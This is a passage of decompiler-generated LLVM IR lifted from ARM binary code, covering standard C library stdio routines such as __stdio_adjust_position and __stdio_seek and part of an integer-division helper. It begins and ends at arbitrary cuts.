dec_label_pc_16784:                               ; preds = %dec_label_pc_1670c, %dec_label_pc_16738, %dec_label_pc_16724
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16788

dec_label_pc_16788:                               ; preds = %dec_label_pc_16750, %dec_label_pc_16784
  %v0_16788 = load i32, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16788 = icmp eq i32 %v0_16788, 0
  br i1 %v2_16788, label %dec_label_pc_16790, label %dec_label_pc_16804

dec_label_pc_16790:                               ; preds = %dec_label_pc_16788
  %v0_16790 = load i32, i32* @r7, align 4
  %v1_16790 = add i32 %v0_16790, 60
  %v2_16790 = inttoptr i32 %v1_16790 to i32*
  %v3_16790 = load i32, i32* %v2_16790, align 4
  %v1_16794 = add i32 %v3_16790, -1
  store i32 %v1_16794, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16798 = icmp eq i32 %v1_16794, 0
  store i32 %v1_16794, i32* %v2_16790, align 4
  br i1 %v2_16798, label %dec_label_pc_167a4, label %dec_label_pc_16804

dec_label_pc_167a4:                               ; preds = %dec_label_pc_16790
  %v0_167a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_167a4 = load i32, i32* @r7, align 4
  %v2_167a4 = add i32 %v1_167a4, 64
  %v3_167a4 = inttoptr i32 %v2_167a4 to i32*
  store i32 %v0_167a4, i32* %v3_167a4, align 4
  %v0_167a8 = load i32, i32* @r7, align 4
  %v1_167a8 = add i32 %v0_167a8, 56
  store i32 %v1_167a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %dec_label_pc_167dc.dec_label_pc_167ac_crit_edge, %dec_label_pc_167a4
  %v0_167b4 = phi i32 [ %v0_167b4.pre, %dec_label_pc_167dc.dec_label_pc_167ac_crit_edge ], [ %v1_167a8, %dec_label_pc_167a4 ]
  %v0_167ac = phi i32 [ %v0_167ac.pre, %dec_label_pc_167dc.dec_label_pc_167ac_crit_edge ], [ %v0_167a8, %dec_label_pc_167a4 ]
  %v1_167ac = add i32 %v0_167ac, 56
  %v2_167ac = inttoptr i32 %v1_167ac to i32*
  %v3_167ac = load i32, i32* %v2_167ac, align 4
  store i32 %v3_167ac, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_167b4, i32* %r2.global-to-local, align 4
  %v1_167b825 = inttoptr i32 %v0_167b4 to i32*
  %v2_167b826 = load i32, i32* %v1_167b825, align 4
  store i32 %v2_167b826, i32* %r3.global-to-local, align 4
  %v3_167bc28 = icmp uge i32 %v2_167b826, %v3_167ac
  store i1 %v3_167bc28, i1* %cpsr_c.global-to-local, align 1
  %v9_167bc34 = icmp eq i32 %v2_167b826, %v3_167ac
  br i1 %v9_167bc34, label %dec_label_pc_167c4, label %dec_label_pc_167dc

dec_label_pc_167c4:                               ; preds = %dec_label_pc_167ac, %dec_label_pc_167c4.dec_label_pc_167b8_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_167d4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_167d4, label %dec_label_pc_167d8, label %dec_label_pc_167c4.dec_label_pc_167b8_crit_edge

dec_label_pc_167c4.dec_label_pc_167b8_crit_edge:  ; preds = %dec_label_pc_167c4
  %v0_167b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_167bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_167b8 = inttoptr i32 %v0_167b8.pre to i32*
  %v2_167b8 = load i32, i32* %v1_167b8, align 4
  store i32 %v2_167b8, i32* %r3.global-to-local, align 4
  %v3_167bc = icmp uge i32 %v2_167b8, %v1_167bc.pre
  store i1 %v3_167bc, i1* %cpsr_c.global-to-local, align 1
  %v9_167bc = icmp eq i32 %v2_167b8, %v1_167bc.pre
  br i1 %v9_167bc, label %dec_label_pc_167c4, label %dec_label_pc_167dc

dec_label_pc_167d8:                               ; preds = %dec_label_pc_167c4
  %v0_167d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_167d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167ac, %dec_label_pc_167c4.dec_label_pc_167b8_crit_edge, %dec_label_pc_167d8
  %v0_167e4 = phi i32 [ %v0_167d8, %dec_label_pc_167d8 ], [ %v2_167b826, %dec_label_pc_167ac ], [ %v2_167b8, %dec_label_pc_167c4.dec_label_pc_167b8_crit_edge ]
  %v1_167dc = phi i32 [ %v0_167d8, %dec_label_pc_167d8 ], [ %v3_167ac, %dec_label_pc_167ac ], [ %v1_167bc.pre, %dec_label_pc_167c4.dec_label_pc_167b8_crit_edge ]
  %v3_167dc = icmp uge i32 %v0_167e4, %v1_167dc
  store i1 %v3_167dc, i1* %cpsr_c.global-to-local, align 1
  %v9_167dc = icmp eq i32 %v0_167e4, %v1_167dc
  br i1 %v9_167dc, label %dec_label_pc_167e4, label %dec_label_pc_167dc.dec_label_pc_167ac_crit_edge

dec_label_pc_167dc.dec_label_pc_167ac_crit_edge:  ; preds = %dec_label_pc_167dc
  %v0_167ac.pre = load i32, i32* @r7, align 4
  %v0_167b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_167ac

dec_label_pc_167e4:                               ; preds = %dec_label_pc_167dc
  %v2_167e4 = icmp ne i32 %v1_167dc, 0
  store i1 %v2_167e4, i1* %cpsr_c.global-to-local, align 1
  %v7_167e8 = icmp slt i32 %v1_167dc, 2
  br i1 %v7_167e8, label %dec_label_pc_16804, label %dec_label_pc_167ec

dec_label_pc_167ec:                               ; preds = %dec_label_pc_167e4
  %v0_167f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_167f0 = add i32 %v0_167f0, 129
  store i32 %v1_167f0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %dec_label_pc_16790, %dec_label_pc_16788, %dec_label_pc_167ec, %dec_label_pc_167e4, %dec_label_pc_16670
  %v0_16804 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v3_16658, i32* @r4, align 4
  store i32 %v6_16658, i32* @r5, align 4
  store i32 %v12_16658, i32* @r7, align 4
  ret i32 %v0_16804

; uselistorder directives
  uselistorder i32 %v0_167d8, { 1, 0, 2 }
  uselistorder i32 %v1_167bc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16738, { 1, 0 }
  uselistorder i32 %v0_1671c, { 0, 2, 1 }
  uselistorder i32 %v1_166c4.pre, { 1, 0 }
  uselistorder i32 %v2_1665c, { 0, 2, 1 }
  uselistorder i32 %tmp18, { 2, 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 16, 4, 5, 6, 7, 8, 9, 10, 12, 11, 15, 13, 14 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 16, 17, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 11, 12, 13 }
  uselistorder i32 129, { 1, 0, 9, 10, 11, 7, 8, 12, 3, 13, 14, 4, 5, 6, 2, 15, 16 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 40, 36, 37 }
  uselistorder i32 -61441, { 1, 2, 18, 19, 20, 21, 22, 23, 14, 15, 16, 17, 24, 25, 6, 7, 3, 26, 27, 28, 29, 8, 9, 10, 11, 12, 13, 0, 35, 4, 5, 30, 31, 32, 33, 34 }
  uselistorder i32 22, { 1, 10, 11, 2, 3, 13, 4, 15, 0, 14, 5, 6, 7, 8, 12, 9 }
  uselistorder label %dec_label_pc_16804, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_167dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_167c4, { 1, 0 }
  uselistorder label %dec_label_pc_16788, { 1, 0 }
  uselistorder label %dec_label_pc_16784, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16700, { 1, 0 }
  uselistorder label %dec_label_pc_166f4, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_166e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166cc, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16818 = load i32, i32* @r4, align 4
  store i32 %v3_16818, i32* %stack_var_-12, align 4
  %v3_1681c = load i16, i16* %arg1, align 2
  %v4_1681c = zext i16 %v3_1681c to i32
  store i32 %v4_1681c, i32* @ip, align 4
  %tmp16 = urem i16 %v3_1681c, 4
  %v1_16820 = zext i16 %tmp16 to i32
  store i32 %v1_16820, i32* %r2.global-to-local, align 4
  %v2_16820 = icmp eq i16 %tmp16, 0
  br i1 %v2_16820, label %bb, label %dec_label_pc_16830

bb:                                               ; preds = %entry
  br label %bb13

dec_label_pc_16830:                               ; preds = %entry
  %v1_16830 = add nsw i32 %v1_16820, -1
  %v7_16830 = icmp eq i16 %tmp16, 1
  br i1 %v7_16830, label %bb13, label %dec_label_pc_16838

dec_label_pc_16838:                               ; preds = %dec_label_pc_16830
  %v1_16838 = and i32 %v4_1681c, 2048
  %v2_16838 = icmp eq i32 %v1_16838, 0
  br i1 %v2_16838, label %bb13, label %dec_label_pc_16840

dec_label_pc_16840:                               ; preds = %dec_label_pc_16838
  %v7_16840 = icmp eq i32 %v1_16830, 2
  br i1 %v7_16840, label %dec_label_pc_168cc, label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %dec_label_pc_16840
  %v2_16848 = add i32 %tmp, 40
  %v3_16848 = inttoptr i32 %v2_16848 to i32*
  %v4_16848 = load i32, i32* %v3_16848, align 4
  store i32 %v4_16848, i32* %r3.global-to-local, align 4
  %v2_1684c = icmp eq i32 %v4_16848, 0
  br i1 %v2_1684c, label %dec_label_pc_16854, label %dec_label_pc_168cc

dec_label_pc_16854:                               ; preds = %dec_label_pc_16848
  %v2_16854 = add i32 %tmp, 44
  %v3_16854 = inttoptr i32 %v2_16854 to i32*
  %v4_16854 = load i32, i32* %v3_16854, align 4
  store i32 %v4_16854, i32* %r3.global-to-local, align 4
  %v2_16858 = add i32 %tmp, 3
  %v3_16858 = inttoptr i32 %v2_16858 to i8*
  %v4_16858 = load i8, i8* %v3_16858, align 1
  %v5_16858 = zext i8 %v4_16858 to i32
  store i32 %v5_16858, i32* %r2.global-to-local, align 4
  %v2_1685c = icmp eq i32 %v4_16854, 0
  br i1 %v2_1685c, label %.thread1, label %bb12

.thread1:                                         ; preds = %dec_label_pc_16854
  %v1_168643 = sub nsw i32 0, %v5_16858
  br label %bb13

bb12:                                             ; preds = %dec_label_pc_16854
  %v3_16860 = add i32 %tmp, 2
  %v4_16860 = inttoptr i32 %v3_16860 to i8*
  %v5_16860 = load i8, i8* %v4_16860, align 1
  %v6_16860 = zext i8 %v5_16860 to i32
  store i32 %v6_16860, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_16860, %v5_16858
  %v3_16868 = sub nsw i32 0, %sum
  br label %bb13

bb13:                                             ; preds = %bb, %.thread1, %dec_label_pc_16838, %dec_label_pc_16830, %bb12
  %v1_1687c = phi i32 [ %v1_168643, %.thread1 ], [ %v1_16830, %dec_label_pc_16838 ], [ %v1_16830, %dec_label_pc_16830 ], [ 0, %bb ], [ %v3_16868, %bb12 ]
  %v1_1686c = and i32 %v4_1681c, 64
  %v2_1686c = icmp eq i32 %v1_1686c, 0
  %v2_16870 = add i32 %tmp, 16
  %v3_16870 = inttoptr i32 %v2_16870 to i32*
  %v4_16870 = load i32, i32* %v3_16870, align 4
  store i32 %v4_16870, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1686c, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1687c = sub i32 %v1_1687c, %v4_16870
  store i32 %v2_1687c, i32* %r3.global-to-local, align 4
  %v1_16880 = inttoptr i32 %arg2 to i32*
  %v2_16880 = load i32, i32* %v1_16880, align 4
  store i32 %v2_16880, i32* %r0.global-to-local, align 4
  %v3_16880 = add i32 %arg2, 4
  %v4_16880 = inttoptr i32 %v3_16880 to i32*
  %v5_16880 = load i32, i32* %v4_16880, align 4
  %v2_16884 = add i32 %storemerge, %v2_1687c
  store i32 %v2_16884, i32* %r4.global-to-local, align 4
  %v2_16888 = sub i32 %v2_16880, %v2_16884
  store i32 %v2_16888, i32* %r2.global-to-local, align 4
  %v2_1688c = and i32 %v2_16884, 1073741824
  %v3_1688c = icmp ne i32 %v2_1688c, 0
  %v4_1688c = ashr i32 %v2_16884, 31
  %v6_1688c = icmp eq i1 %v3_1688c, false
  %v7_1688c = sub i32 %v5_16880, %v4_1688c
  %v9_1688c = sext i1 %v6_1688c to i32
  %v10_1688c = add i32 %v7_1688c, %v9_1688c
  store i32 %v10_1688c, i32* %r3.global-to-local, align 4
  %v2_16890 = sub i32 %v10_1688c, %v5_16880
  %v4_16890 = xor i32 %v10_1688c, %v5_16880
  %v5_16890 = xor i32 %v2_16890, %v10_1688c
  %v6_16890 = and i32 %v5_16890, %v4_16890
  %v7_16890 = icmp slt i32 %v6_16890, 0
  %v8_16890 = icmp slt i32 %v2_16890, 0
  %v9_16890 = icmp eq i32 %v10_1688c, %v5_16880
  store i32 %v2_16888, i32* %v1_16880, align 4
  %v5_16894 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_16894, i32* %v4_16880, align 4
  %v3_16898 = xor i1 %v8_16890, %v7_16890
  %v4_16898 = or i1 %v9_16890, %v3_16898
  br i1 %v4_16898, label %dec_label_pc_1689c, label %dec_label_pc_168a8

dec_label_pc_1689c:                               ; preds = %bb13
  br i1 %v9_16890, label %dec_label_pc_168a0, label %dec_label_pc_168acthread-pre-split

dec_label_pc_168a0:                               ; preds = %dec_label_pc_1689c
  %v0_168a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_168a0 = load i32, i32* %r0.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v0_168a0, %v1_168a0
  br i1 %tmp17, label %dec_label_pc_168a8, label %dec_label_pc_168acthread-pre-split

dec_label_pc_168a8:                               ; preds = %dec_label_pc_168a0, %bb13
  %v0_168a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_168a8 = sub i32 0, %v0_168a8
  store i32 %v1_168a8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_168ac

dec_label_pc_168acthread-pre-split:               ; preds = %dec_label_pc_168a0, %dec_label_pc_1689c
  %v0_168ac.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_168ac

dec_label_pc_168ac:                               ; preds = %dec_label_pc_168acthread-pre-split, %dec_label_pc_168a8
  %v0_168ac = phi i32 [ %v0_168ac.pr, %dec_label_pc_168acthread-pre-split ], [ %v1_168a8, %dec_label_pc_168a8 ]
  %v1_168ac = icmp slt i32 %v0_168ac, 0
  br i1 %v1_168ac, label %dec_label_pc_168b4, label %dec_label_pc_168d0

dec_label_pc_168b4:                               ; preds = %dec_label_pc_168ac
  store i32 47660, i32* %r3.global-to-local, align 4
  %v0_168b8 = call i32 @__aeabi_read_tp()
  store i32 %v0_168b8, i32* %r0.global-to-local, align 4
  %v3_168bc = load i16, i16* @global_var_222f0.75, align 2
  %v4_168bc = sext i16 %v3_168bc to i32
  store i32 %v4_168bc, i32* %r3.global-to-local, align 4
  store i32 75, i32* %r2.global-to-local, align 4
  %v3_168c4 = add i32 %v4_168bc, %v0_168b8
  %v4_168c4 = inttoptr i32 %v3_168c4 to i32*
  store i32 75, i32* %v4_168c4, align 4
  %v0_168d0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_168d0

dec_label_pc_168cc:                               ; preds = %dec_label_pc_16848, %dec_label_pc_16840
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_168d0

dec_label_pc_168d0:                               ; preds = %dec_label_pc_168ac, %dec_label_pc_168b4, %dec_label_pc_168cc
  %v0_168d0 = phi i32 [ %v0_168ac, %dec_label_pc_168ac ], [ %v0_168d0.pre, %dec_label_pc_168b4 ], [ -1, %dec_label_pc_168cc ]
  store i32 %v0_168d0, i32* %r0.global-to-local, align 4
  %v2_168d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_168d4, i32* @r4, align 4
  ret i32 %v0_168d0

; uselistorder directives
  uselistorder i32 %v0_168d0, { 1, 0 }
  uselistorder i1 %v9_16890, { 1, 0 }
  uselistorder i32 %v2_16890, { 1, 0 }
  uselistorder i32 %v10_1688c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_16880, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 8, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i16* @global_var_222f0.75, { 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 96, 95, 94, 93, 92, 64, 91, 90, 89, 86, 62, 61, 60, 59, 58, 57, 43, 42, 41, 88, 87, 39, 40, 50, 49, 85, 84, 52, 14, 13, 81, 38, 37, 51, 63, 34, 33, 47, 48, 15, 65, 36, 35, 46, 45, 44, 56, 55, 83, 82, 80, 79, 78, 77, 71, 6, 29, 17, 76, 11, 12, 28, 27, 10, 5, 4, 9, 8, 7, 16, 26, 25, 54, 53, 74, 75, 24, 23, 70, 32, 31, 19, 22, 21, 30, 20, 69, 18, 68, 66, 67, 3, 2, 0, 1, 73, 72 }
  uselistorder i16 0, { 7, 8, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i16 4, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_168d0, { 2, 1, 0 }
  uselistorder label %bb13, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_168ec = load i32, i32* %arg2, align 4
  %v3_168ec = add i32 %tmp, 4
  %v4_168ec = inttoptr i32 %v3_168ec to i32*
  %v5_168ec = load i32, i32* %v4_168ec, align 4
  %v1_168f0 = add i32 %arg1, 4
  %v2_168f0 = inttoptr i32 %v1_168f0 to i32*
  %v3_168f0 = load i32, i32* %v2_168f0, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_168f8 = call i32 @__GI_lseek64(i32 %v3_168f0, i32 %tmp, i32 %v2_168ec, i32 %v5_168ec)
  %v1_168fc = icmp slt i32* %arg2, null
  br i1 %v1_168fc, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_169045 = load i32, i32* @r4, align 4
  %v4_169046 = inttoptr i32 %v3_169045 to i32*
  store i32 %v4_168f8, i32* %v4_169046, align 4
  %v6_169047 = add i32 %v3_169045, 4
  %v7_169048 = inttoptr i32 %v6_169047 to i32*
  store i32 %tmp, i32* %v7_169048, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_168f8, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 7, 3, 0, 4, 5, 1, 8, 9, 10, 11, 6, 12 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_lseek64, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1691c = load i32, i32* @r1, align 4
  %v1_1691c = icmp slt i32 %v0_1691c, 0
  %v2_1691c = icmp eq i32 %v0_1691c, 0
  %v2_16920 = xor i32 %v0_1691c, %arg1
  br i1 %v2_1691c, label %dec_label_pc_16a34, label %dec_label_pc_16928

dec_label_pc_16928:                               ; preds = %entry
  br i1 %v1_1691c, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_16928
  %v2_16928 = sub i32 0, %v0_1691c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_16928, %bb
  %v1_169f4 = phi i32 [ %v2_16928, %bb ], [ %v0_1691c, %dec_label_pc_16928 ]
  %v1_1692c = add i32 %v1_169f4, -1
  %v7_1692c = icmp eq i32 %v1_169f4, 1
  br i1 %v7_1692c, label %dec_label_pc_169d4, label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %thread-pre-split
  %v1_16934 = icmp slt i32 %arg1, 0
  br i1 %v1_16934, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_16934
  %v2_16938 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_16934, %bb85
  %v0_16a28 = phi i32 [ %arg1, %dec_label_pc_16934 ], [ %v2_16938, %bb85 ]
  %v3_1693c = icmp uge i32 %v0_16a28, %v1_169f4
  %v9_1693c = icmp eq i32 %v0_16a28, %v1_169f4
  %v2_16940 = xor i1 %v3_1693c, true
  %v3_16940 = or i1 %v9_1693c, %v2_16940
  br i1 %v3_16940, label %dec_label_pc_169e0, label %dec_label_pc_16944

dec_label_pc_16944:                               ; preds = %bb86
  %v2_16944 = and i32 %v1_1692c, %v1_169f4
  %v4_16944 = icmp eq i32 %v2_16944, 0
  br i1 %v4_16944, label %dec_label_pc_169f0, label %dec_label_pc_1694c

dec_label_pc_1694c:                               ; preds = %dec_label_pc_16944
  %v3_1694c = icmp ult i32 %v1_169f4, 536870912
  br i1 %v3_1694c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1694c
  %v4_16950 = mul i32 %v1_169f4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1694c, %.thread
  %v0_16970.pr40.ph = phi i32 [ %v4_16950, %.thread ], [ %v1_169f4, %dec_label_pc_1694c ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1694c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_16970.pr40 = phi i32 [ %v4_16964, %bb89 ], [ %v0_16970.pr40.ph, %.preheader.preheader ]
  %v1_16968 = phi i32 [ %v4_16968, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1695c = icmp ugt i32 %v0_16970.pr40, 268435455
  br i1 %v2_1695c, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_16970thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_16960 = icmp ult i32 %v0_16970.pr40, %v0_16a28
  br i1 %v4_16960, label %bb88, label %dec_label_pc_16970thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_16964 = and i32 %v0_16970.pr40, 268435456
  %v3_16964 = icmp eq i32 %v2_16964, 0
  %v4_16964 = mul i32 %v0_16970.pr40, 16
  br i1 %v3_16964, label %bb89, label %dec_label_pc_16970.loopexit

bb89:                                             ; preds = %bb88
  %v2_16968 = and i32 %v1_16968, 268435456
  %v3_16968 = icmp eq i32 %v2_16968, 0
  %v4_16968 = mul i32 %v1_16968, 16
  br i1 %v3_16968, label %.preheader, label %dec_label_pc_16970thread-pre-split.loopexit.loopexit

dec_label_pc_16970thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1697c52.ph = phi i32 [ %v1_16968, %bb87 ], [ %v4_16968, %bb89 ]
  %v0_16970.pr42.ph = phi i32 [ %v0_16970.pr40, %bb87 ], [ %v4_16964, %bb89 ]
  br label %dec_label_pc_16970thread-pre-split.loopexit

dec_label_pc_16970thread-pre-split.loopexit:      ; preds = %dec_label_pc_16970thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1697c52 = phi i32 [ %v1_16968, %.thread3 ], [ %v1_1697c52.ph, %dec_label_pc_16970thread-pre-split.loopexit.loopexit ]
  %v0_16970.pr42 = phi i32 [ %v0_16970.pr40, %.thread3 ], [ %v0_16970.pr42.ph, %dec_label_pc_16970thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_16970thread-pre-split

dec_label_pc_16970thread-pre-split:               ; preds = %dec_label_pc_16970thread-pre-split.loopexit, %bb91
  %v1_1697c50 = phi i32 [ %v1_1697c52, %dec_label_pc_16970thread-pre-split.loopexit ], [ %v3_1697c, %bb91 ]
  %v2_1697448 = phi i32 [ %v0_16a28, %dec_label_pc_16970thread-pre-split.loopexit ], [ %v2_16974, %bb91 ]
  %v0_16970.pr = phi i32 [ %v0_16970.pr42, %dec_label_pc_16970thread-pre-split.loopexit ], [ %v3_16978, %bb91 ]
  br label %dec_label_pc_16970

dec_label_pc_16970.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_16970

dec_label_pc_16970:                               ; preds = %dec_label_pc_16970.loopexit, %dec_label_pc_16970thread-pre-split
  %v1_1697c = phi i32 [ %v1_1697c50, %dec_label_pc_16970thread-pre-split ], [ %v1_16968, %dec_label_pc_16970.loopexit ]
  %v2_16974 = phi i32 [ %v2_1697448, %dec_label_pc_16970thread-pre-split ], [ %v0_16a28, %dec_label_pc_16970.loopexit ]
  %v1_16978 = phi i32 [ %v0_16970.pr, %dec_label_pc_16970thread-pre-split ], [ %v4_16964, %dec_label_pc_16970.loopexit ]
  %v2_16970 = icmp slt i32 %v1_16978, 0
  br i1 %v2_16970, label %dec_label_pc_16984, label %bb90

bb90:                                             ; preds = %dec_label_pc_16970
  %v4_16974 = icmp ult i32 %v1_16978, %v2_16974
  br i1 %v4_16974, label %bb91, label %dec_label_pc_16984

bb91:                                             ; preds = %bb90
  %v3_16978 = mul i32 %v1_16978, 2
  %v2_1697c = icmp slt i32 %v1_1697c, 0
  %v3_1697c = mul i32 %v1_1697c, 2
  br i1 %v2_1697c, label %dec_label_pc_16984, label %dec_label_pc_16970thread-pre-split

dec_label_pc_16984:                               ; preds = %bb90, %dec_label_pc_16970, %bb91
  %v2_1699063 = phi i32 [ %v3_1697c, %bb91 ], [ %v1_1697c, %bb90 ], [ %v1_1697c, %dec_label_pc_16970 ]
  %v1_1698855 = phi i32 [ %v3_16978, %bb91 ], [ %v1_16978, %bb90 ], [ %v1_16978, %dec_label_pc_16970 ]
  br label %dec_label_pc_16988

dec_label_pc_16988:                               ; preds = %.thread13, %dec_label_pc_16984
  %v1_169bc = phi i32 [ %v4_169bc, %.thread13 ], [ %v2_1699063, %dec_label_pc_16984 ]
  %v1_16990 = phi i32 [ %v1_169cc, %.thread13 ], [ 0, %dec_label_pc_16984 ]
  %v1_169c0 = phi i32 [ %v4_169c0, %.thread13 ], [ %v1_1698855, %dec_label_pc_16984 ]
  %v1_1698c = phi i32 [ %v0_169b8, %.thread13 ], [ %v0_16a28, %dec_label_pc_16984 ]
  %v3_16988 = icmp ult i32 %v1_1698c, %v1_169c0
  br i1 %v3_16988, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_16988
  %v3_1698c = sub i32 %v1_1698c, %v1_169c0
  %v3_16990 = or i32 %v1_16990, %v1_169bc
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_16988, %bb92
  %v1_16998 = phi i32 [ %v1_1698c, %dec_label_pc_16988 ], [ %v3_1698c, %bb92 ]
  %v1_1699c = phi i32 [ %v1_16990, %dec_label_pc_16988 ], [ %v3_16990, %bb92 ]
  %v4_16994 = udiv i32 %v1_169c0, 2
  %v6_16994 = icmp ult i32 %v1_16998, %v4_16994
  br i1 %v6_16994, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_16998 = urem i32 %v1_169c0, 2
  %v4_16998 = icmp eq i32 %v3_16998, 0
  %v6_16998 = sub i32 %v1_16998, %v4_16994
  br i1 %v4_16998, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1699c = udiv i32 %v1_169bc, 2
  %v6_1699c = or i32 %v1_1699c, %v5_1699c
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_169a4 = phi i32 [ %v6_16998, %bb93 ], [ %v1_16998, %.thread8 ], [ %v6_16998, %bb94 ]
